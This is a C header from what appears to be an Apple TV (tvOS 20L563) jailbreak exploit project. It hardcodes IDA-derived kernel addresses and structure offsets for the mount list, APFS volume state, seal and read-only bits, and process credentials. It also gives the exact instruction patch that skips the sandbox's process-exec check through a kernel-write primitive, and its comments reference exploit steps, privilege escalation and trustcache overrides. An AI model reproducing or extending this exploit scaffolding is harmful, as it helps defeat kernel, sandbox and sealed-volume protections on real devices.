#pragma once

#include <stdbool.h>
#include <stdint.h>

struct dynamic_info;

#ifdef __cplusplus
extern "C" {
#endif

extern bool g_dt_baked_offsets_active;

/// IDA `_rootvnode` @ kernelcache.j105a.20L563.macho — unslid VA (slide + this).
/// Verified: `_vfs_rootvnode` @ 0xfffffff00737577c loads [0xfffffff0078d9050].
/// koff from staticBase 0xfffffff007004000 = 0x8D5050 (use unslid VA, not a hand-computed koff).
#define DT_BAKED_ROOTVNODE_UNSLID 0xfffffff0078d9050ULL

/// mount typeinfo — IDA _vfs_typenum @ 0xfffffff007373bc0 reads mount+0x30 then +0x18.
#define DT_BAKED_MOUNT_TYPEINFO 0x30
/// mount.mnt_data / vfs_fsprivate — IDA _vfs_fsprivate @ 0xfffffff007374830 and _vfs_setfsprivate @ 0xfffffff007374884.
#define DT_BAKED_MOUNT_FSPRIVATE 0x8F8
/// IDA _vfs_iterate @ 0xfffffff007347ebc walks qword_FFFFFFF0078D9088 via mount+0.
#define DT_BAKED_MOUNTLIST_UNSLID 0xfffffff0078d9088ULL
#define DT_BAKED_MOUNT_LIST_NEXT 0
/// IDA _vfs_iterate compares embedded statfs fsid at mount+0xC0/+0xC4.
#define DT_BAKED_MOUNT_STATFS_FSID0 0xC0
#define DT_BAKED_MOUNT_STATFS_FSID1 0xC4

/// APFS per-mount state (vfs_fsprivate / apfs struct) — IDA apfs_mount_update @ sub_FFFFFFF006A27314.
#define DT_BAKED_APFS_READONLY      692   // apfs->apfs_readonly; dword index 173 in vnops
/// vfs_typenum(mp) @ 0xfffffff007373bc0: LDR X8,[mp,#0x30]; LDR W0,[X8,#0x18].
#define DT_BAKED_APFS_TYPENUM       24
#define DT_BAKED_APFS_VOL_SB        192   // *(apfs+192) in-memory volume superblock ptr
#define DT_BAKED_APFS_REVERT_XID    248   // revert_to_snapshot sets/checks this xid
#define DT_BAKED_APFS_CONTAINER     208   // *(apfs+208) container @ #0xD0 — IDA apfs_mount_update @ 0xa27338
#define DT_BAKED_APFS_CHILD_VOL_SB  216   // *(apfs+216) snapshot child vol **name** strdup @ #0xD8 — NOT vol_sb (IDA @ 0x9e017c BL strdup, STR @ 0x9e0180). vol_sb is +0xC0.
#define DT_BAKED_APFS_BACKUP_VOL_SB 200   // *(apfs+200) revert backup vol_sb @ #0xC8 — IDA revert_to_snapshot @ 0x974694
#define DT_BAKED_APFS_MOUNT_SUBSTATE 328  // *(apfs+328) dword @ #0x148 — IDA apfs_vfsop_mount @ 0x9da82c LDR W8,[X0,#0x148]
#define DT_BAKED_APFS_VOL_ID        728   // *(apfs+728) volume id @ #0x2D8 — IDA revert_to_snapshot @ 0x9743f0
/// IDA APFS mounted-volume matcher @ 0xfffffff0069e4600 treats apfs+0x2D8 as a vnode and compares vnode_specrdev().
#define DT_BAKED_APFS_DEVVP         DT_BAKED_APFS_VOL_ID
#define DT_BAKED_APFS_VOL_LIST_NEXT 816   // *(apfs+816) sibling apfs @ #0x330 — IDA revert_to_snapshot @ 0x974404
#define DT_BAKED_APFS_VOL_LIST_PREV 824   // *(apfs+824) prev in container vol list @ #0x338 — IDA handle_mount @ 0x9e0ba0
#define DT_BAKED_APFS_MAIN_APFS     312   // *(apfs+312) apfs_main_apfs @ #0x138 — IDA sub_FFFFFFF0069C1798 CSEL
#define DT_BAKED_APFS_MOUNT_MP      720   // *(apfs+720) mount_t @ #0x2D0 — IDA handle_mount @ 0x9e08c8; hollow shell @ 0x9daff8
#define DT_BAKED_APFS_STATE_QWORD   288   // *(apfs+288) flags @ #0x120 — bit 0x40 mounted (IDA handle_mount @ 0x9e0bdc)
#define DT_BAKED_APFS_EPHEMERAL_GRAFT_COUNT 8584  // *(apfs+8584) word — IDA apfs_mount_update @ 0xa27460
#define DT_BAKED_CONTAINER_NX_SB    192   // *(container+192) inner nx sb ptr @ #0xC0 — IDA revert_to_snapshot @ 0x974294
#define DT_BAKED_CONTAINER_VOL_LIST 496   // *(container+496) apfs volume list head @ #0x1F0 — IDA @ 0x9743dc
#define DT_BAKED_CONTAINER_VOL_LIST_TAIL 504 // *(container+504) vol list tail @ #0x1F8 — IDA handle_mount @ 0x9e0b9c
#define DT_BAKED_CONTAINER_MU_GATE  316   // *(container+316) mount_update RO gate @ #0x13C — IDA @ 0xa2733c
#define DT_BAKED_CONTAINER_REMAP    324   // *(container+324) remap flag @ #0x144 — IDA apfs_mount_update @ 0xa273b8
#define DT_BAKED_CONTAINER_NX_SB_BUF 200  // *(container+200) nx sb buffer ptr @ #0xC8 — IDA nx_rw_update LDR @ 0x987904 and @ 0x987978
#define DT_BAKED_NXSB_WRITABLE     1268   // *(nxsb+1268) writable dword @ #0x4F4 — IDA nx_rw_update @ 0x987908/0x98797c
#define DT_BAKED_APFS_REMAP_MODE_BYTE 289 // *(apfs+289) remap mode byte @ #0x121 — IDA apfs_mount_update @ 0xa273c0
#define DT_BAKED_NXSB_BUF_MAGIC_OFF 32    // NXSB magic dword offset in nx sb buffer — IDA @ 0x9974bc
#define DT_BAKED_APFS_SNAPSHOT_MOUNT DT_BAKED_APFS_MAIN_APFS  // legacy alias (same qword[39] slot)
#define DT_BAKED_APFS_VOL_QWORD48   48    // vol_sb+48 — apfs_mount_update EROFS if not 0 or 2
#define DT_BAKED_APFS_VOL_BYTE56    56    // vol_sb+56 byte @ #0x38: create gate; bit 0x20 sealed in mount_update
#define DT_BAKED_APFS_VOL_SB_REVERT160 160 // revert_to_snapshot clears @ 0xfffffff0069748c8
#define DT_BAKED_APFS_VOL_SB_REVERT168 168 // paired xid field cleared with +160
#define DT_BAKED_APFS_VOL_SB_MAGIC  0x4253584eULL // 'NXSB' — sanity before vol_sb physwrite (build37)
#define DT_BAKED_APFS_FSNODE_RO_GATE 157  // fsnode[157] & 0xC0 → EROFS apfs_vnop_create @ 0xfffffff0069b0388
#define DT_BAKED_APFS_FSNODE_RO_MASK 0xC0
/// IDA: LDRB [vol_sb,#0x38]; TST W8,#9 @ 0xfffffff0069bd4bc (apfs_vfs_create path),
///      0xfffffff006a0349c (btree lookup), 0xfffffff0069bc690 (name norm). Clear bits 0,3 only.
#define DT_BAKED_APFS_VOL_SB_CREATE_MASK 0x9
/// IDA: apfs_mount_update @ 0xfffffff006a27414 — vol_sb+56 bit 0x20 sealed; build37 clears only this bit.
#define DT_BAKED_APFS_VOL_SB_SEAL_MASK 0x20
/// IDA: apfs_mount_update @ 0xfffffff006a273a8 — vol_sb+0x30 qword; allowed 0 or 2.
#define DT_BAKED_APFS_VOL_QWORD48_ALLOWED 2ULL
/// IDA apfs_vfsop_mount write-upgrade @ 0xfffffff0069da710 ORR #0x20 + 0xfffffff0069da720 ORR #1.
#define DT_BAKED_APFS_MOUNT_WRITE_UPGRADE_FLAGS 0x21ULL
/// IDA apfs_mount_update — sole caller apfs_vfsop_mount BL @ 0xfffffff0069da970 (unslid VA).
#define DT_BAKED_APFS_MOUNT_UPDATE_UNSLID 0xfffffff006a27314ULL
/// IDA apfs_vfsop_mount mount-arg halfword @ copyin buffer +0 — jumptable LDRH @ 0x9da2e4 (cases 0–8).
/// mount_apfs -c sets apfs mode 5 in mount-data @ 0x100002004 only — NOT MNT_UPDATE in v71[0].
/// MNT_UPDATE (0x10000) in v71[0] only via -o update (getmntopts flag @ 0x1000081d4).
/// Jumptable mode 5 used when vfs_isupdate @ 0x9da238 returns 0.
/// Exploit step8 uses mount(..., MNT_UPDATE, …): vfs_isupdate≠0 → "updating mounted" @ 0x9da540
/// → vfs_iswriteupgrade CBZ @ 0x9da634 → apfs_mount_update @ 0x9da970.
#define DT_BAKED_APFS_MOUNT_JUMPTABLE_MNT_UPDATE 5ULL

/// --- build95 G5: sandbox op-129 deny (IDA §27.1, kernelcache.j105a.20L563) ---
/// P1 site is com.apple.security.sandbox:__text (IDA perm r-x, not writable) — patch via kfd kwrite only.
/// mac_policy_ops @ ECAD40+0x7E8 → sub_FFFFFFF006539AE8 (83236C BLR from 35CCD8 ← 5D10EC @ 5D1CD0).
#define DT_BAKED_SANDBOX_MPO_7E8_UNSLID           0xfffffff006539ae8ULL
/// P1 @ 539C78: CBZ W0,loc_539CC4 (pre 0x34000260) → B loc_539C7C (post 0x14000001); skips op-129 @ 539D10.
#define DT_BAKED_SANDBOX_OP129_BRANCH_UNSLID      0xfffffff006539c78ULL
#define DT_BAKED_SANDBOX_OP129_BRANCH_PRE         0x34000260u
#define DT_BAKED_SANDBOX_OP129_BRANCH_P1          0x14000001u
/// 539D10 BL sub_FFFFFFF006540F44 with W1=#0x81 (op 129 process-exec*).
#define DT_BAKED_SANDBOX_OP129_BL_UNSLID          0xfffffff006539d10ULL
#define DT_BAKED_SANDBOX_EVALUATE_UNSLID          0xfffffff006540f44ULL

/// mount.mnt_flag dword @ mp+0x70 — IDA _vfs_flags @ 0xfffffff007373bdc, _vfs_isrdonly @ 0xfffffff007373d74,
/// _vfs_iswriteupgrade LDRB @ 0xfffffff007373d58 (same as off_mount_mnt_flag == 112).
#define DT_BAKED_MOUNT_MNT_FLAG_OFF 112
/// mount.mnt_kern dword @ mp+0x74 — IDA _vfs_iswriteupgrade UBFX bit 26 @ 0xfffffff007373d6c.
#define DT_BAKED_MOUNT_MNT_KERN_OFF 116
#define DT_BAKED_MNT_FLAG_RDONLY_BIT 0x1u
/// _vfs_flags(mp) bit 0xE → apfs_vfsop_mount TBNZ @ 0xfffffff0069da8c4 → EPERM @ 0xfffffff0069daa88.
#define DT_BAKED_MNT_FLAG_VFS_EPERM_BIT 0x4000u
/// mnt_kern bit 26 when mnt_flag byte0 bit0 set — _vfs_iswriteupgrade @ 0xfffffff007373d6c.
#define DT_BAKED_MNT_KERN_WRITEUPGRADE_BIT 0x04000000u

/// vnode_fsnode @ 0xfffffff00737585c: LDR X0,[vp,#0xE0] (v_data / fsnode).
#define DT_BAKED_VNODE_FSDATA       224
/// _vnode_specrdev @ 0xfffffff00737586c: LDR X8,[vp,#0x78]; LDR W0,[X8,#0x18].
#define DT_BAKED_VNODE_SPECINFO     0x78
#define DT_BAKED_SPECINFO_DEV       0x18

bool DTApplyBakedOffsetsForCurrentDevice(void);

/// Re-apply IDA-verified tvOS pmap/proc fields after jbinfo_initialize_hardcoded_offsets().
void DTApplyTvOSPmapStructOverrides(void);

/// Re-apply IDA-verified trustcache symbol + iOS 16+ struct layout after jbinfo.
void DTApplyTvOSTrustcacheOverrides(void);

/// Re-apply tvOS 20L563 proc/proc_ro/ucred fields after jbinfo (priv esc / build 27).
void DTApplyTvOSProcStructOverrides(void);

/// IDA-verified inpcb/socket/protosw for AppleTV6,2 / 20L563 — before DarkSword exploit_init.
void DTApplyTvOSInpcbOverrides(void);

void DTBakedFillKfdDynamicInfo(void);

void DTLogBakedStructOffsets(void);

#ifdef __cplusplus
}
#endif
